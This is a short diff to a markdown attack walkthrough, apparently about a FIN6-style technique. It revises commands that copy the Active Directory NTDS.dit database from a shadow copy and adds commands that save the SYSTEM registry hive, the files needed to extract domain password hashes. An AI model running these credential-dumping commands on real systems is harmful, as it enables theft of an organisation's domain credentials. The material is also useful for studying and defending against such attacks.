@@ -392,9 +392,16 @@ Going back to the source code of this module, we can see that we can now access 
       return true
 ```
 
-To make a copy of the NTDS.dit file from the Shadow Copy to the C:\Users\Public directory, execute the following command:
+To make a copy of the NTDS.dit file from the Shadow Copy, execute the following command:
 
-copy [shadow_copy_name]\windows\ntds\ntds.dit C:\Users\Public\ad_ntds.dit
+```bash
+copy [shadow_copy_name]\windows\ntds\ntds.dit .\ad_ntds.dit
+```
+
+```bash
+reg SAVE HKLM\SYSTEM .\ad_SYS_reg
+copy [shadow_copy_name]\windows\system32\config\SYSTEM .\ad_SYSTEM_cfg
+```
 
 FIN6
 
